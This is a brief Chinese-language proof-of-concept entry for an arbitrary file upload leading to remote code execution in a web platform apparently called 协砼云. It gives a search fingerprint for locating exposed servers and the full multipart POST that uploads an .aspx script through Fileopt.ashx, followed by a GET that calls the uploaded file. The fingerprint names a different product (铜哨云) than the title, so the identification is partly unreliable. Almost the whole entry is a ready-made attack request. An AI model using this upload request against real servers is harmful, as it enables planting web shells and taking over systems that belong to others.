# 协砼云-Fileopt存在任意文件上传导致RCE漏洞

- **系统**：协砼云　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="铜哨云用户中心"`
- **请求**：`POST /Mobile/FrontInterface/Functions/Handles/File/Fileopt.ashx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzlSs4UDJ…`　`Content-Length: 265`

**请求体 / payload**
```
------WebKitFormBoundaryzlSs4UDJdUjA6yb9
Content-Disposition: form-data; name="File";filename="1.aspx"
<%= "Hello World" %>
------WebKitFormBoundaryzlSs4UDJdUjA6yb9
Content-Disposition: form-data; name="session"
1
------WebKitFormBoundaryzlSs4UDJdUjA6yb9--
GET /upload/2025/12/Computer/Officia/f14b76c3-db0d-432d-aae4-486f986842cc.aspx HTTP/1.1
Host:
```
- **预期**：200　|　—